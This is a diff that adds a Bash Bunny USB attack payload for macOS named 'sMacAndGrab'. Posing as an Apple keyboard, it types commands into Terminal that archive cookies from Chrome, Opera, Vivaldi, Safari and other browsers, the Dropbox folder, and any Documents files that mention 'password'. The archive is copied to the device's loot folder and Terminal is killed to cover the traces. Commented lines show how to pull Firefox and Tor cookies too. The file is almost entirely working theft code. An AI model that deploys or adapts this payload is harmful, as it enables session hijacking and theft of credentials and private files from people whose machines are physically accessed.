@@ -1,0 +1,60 @@
+#!/bin/bash
+#
+# Title:         sMacAndGrab
+# Author:        audibleblink
+# Target:      macOS
+# Version:       1.2
+#
+# Backup a list of files from macOS
+#
+# Yellow (blinking)...Attacking
+# Green...............Finished
+
+LED ATTACK
+ATTACKMODE STORAGE HID VID_0X05AC PID_0X021E
+
+# make the loot directory on the BashBunny
+mkdir -p /root/udisk/loot/sMacAndGrab
+
+# mounted device name
+dev_name="BashBunny"
+
+# loot directory when mounted on the mac
+lootdir="/Volumes/$dev_name/loot/sMacAndGrab"
+
+# Add files, folders, or commands that return filenames
+files_to_copy=(
+"\"~/Library/Application Support/Google/Chrome/Default/Cookies\"" # Quote paths with spaces
+"\"~/Library/Application Support/Google/Chrome Canary/Default/Cookies\"" #Grap Chrome Canary Cookies
+"\"~/Library/Application Support/Chromium/Default/Cookies\"" #Grap Chromium Cookies
+"\"~/Library/Application Support/com.operasoftware.Opera/Cookies\"" #Grab Opera Cookies
+"\"~/Library/Application Support/com.operasoftware.OperaDeveloper/Cookies\"" #Grab Opera Developers Cookies
+"\"~/Library/Application Support/Opera Neon/Default/Cookies\"" #Grab Opera Neon Cookies
+"\"~/Library/Application Support/Vivaldi/Default/Cookies\"" #Grab Vivaldi Cookies
+"\"~/Library/Cookies/Cookies.binarycookies\"" #Grab Safari Cookies
+
+# Grab Firefox and Firefox-based Cookies with a written bash command to search for the default profile name
+# Must be edited and escaped to match Bash Bunny Environment
+####################################################
+# 1. Firefox
+# path=$(find "$HOME/Library/Application Support/Firefox/Profiles/" -maxdepth 1 -type d -name '*default*' -print0)
+# file="$path/cookies.sqlite"
+# cp "$file" ~/Desktop/Cookies/FirefoxCookies.db
+####################################################
+# 2. TOR (Firefox-based)
+# path=$(find "$HOME/Library/Application Support/TorBrowser-Data/Browser" -maxdepth 1 -type d -name '*default*' -print0)
+# file="$path/cookies.sqlite"
+# cp "$file" ~/Desktop/Cookies/TORCookies.db
+
+"~/Dropbox"
+"\$(grep -lr password ~/Documents)" # Escape the subshell to have this run on TARGET
+)
+
+QUACK RUN OSX terminal
+QUACK DELAY 4000
+# the more files in $files to copy, the longer tar will take to compress
+# one-liner because we want the move command to wait for tar to finish
+QUACK STRING tar -cf \$USER.tar.gz ${files_to_copy[*]}\; mv \$USER.tar.gz $lootdir\; killall Terminal
+QUACK ENTER
+
+LED FINISH
